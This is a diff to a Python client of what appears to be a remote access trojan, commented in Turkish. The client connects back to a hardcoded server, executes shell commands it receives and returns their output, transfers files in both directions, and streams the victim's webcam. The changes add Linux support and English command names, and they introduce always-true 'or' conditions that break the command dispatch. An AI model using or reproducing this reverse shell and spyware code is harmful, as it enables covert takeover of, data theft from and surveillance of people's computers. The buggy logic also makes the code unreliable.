@@ -1,10 +1,11 @@
 import socket
-import os
+import os, platform
 import subprocess
 import cv2, pickle, struct, imutils
-import time
 
-SERVER_HOST = "172.20.10.4"
+pl = platform.system()
+
+SERVER_HOST = "192.168.1.33"
 SERVER_PORT = 12345
 BUFFER = 1024 # 1KB gönderilen/alınan paketlerin maksimum boyutu
 
@@ -35,7 +36,10 @@ while True:
         try:
             os.chdir(' '.join(splited_command[1:]))
         except:
-            output = subprocess.getoutput(command, encoding='oem')
+            if pl == "Windows":
+                output = subprocess.getoutput(command, encoding='oem')
+            else:
+                output = subprocess.getoutput(command)
             cwd = os.getcwd()
             message = f"{output}{SEPARATOR}{cwd}"
             baglanti.send(message.encode())
@@ -43,7 +47,7 @@ while True:
         else:
             # eğer başarılı olursa, boş mesaj gönder
             output = ""
-    if command.lower() == "indir":
+    if command.lower() == "indir" or "download":
         dosya_ismi = baglanti.recv(BUFFER).decode() # istenilen dosyanın adını aldık
         
         file = open(dosya_ismi, "rb") # dosyayı açtık
@@ -54,8 +58,6 @@ while True:
         
         baglanti.close()
 
-        time.sleep(7)
-
         pport += 1
         baglanti = socket.socket()
         baglanti.connect((SERVER_HOST, pport))
@@ -63,7 +65,7 @@ while True:
         baglanti.send(cwd.encode())
         continue
         
-    if command.lower() == "gonder":
+    if command.lower() == "gonder" or "upload":
         dosya_ismi = baglanti.recv(BUFFER).decode() # gelecek dosyanın adını aldık
         
         file = open(dosya_ismi, "wb") # dosyayı oluşturduk
@@ -73,8 +75,6 @@ while True:
             if not data:
                 file.close()
                 baglanti.close()
-
-                time.sleep(7)
                 
                 pport += 1
                 baglanti = socket.socket()
@@ -85,7 +85,7 @@ while True:
             file.write(data)
         continue
     
-    if command.lower() == "webcam_izle":
+    if command.lower() == "webcam_izle" or "webcam_start":
         while True:
             vid = cv2.VideoCapture(0)
             while(vid.isOpened()):
@@ -113,7 +113,10 @@ while True:
         continue
                     
     else:
-        output = subprocess.getoutput(command, encoding='oem')
+        if pl == "Windows":
+            output = subprocess.getoutput(command, encoding='oem')
+        else:
+            output = subprocess.getoutput(command)
     
     # mevcut çalışma dizinini çıktı olarak alıyoruz
     cwd = os.getcwd()
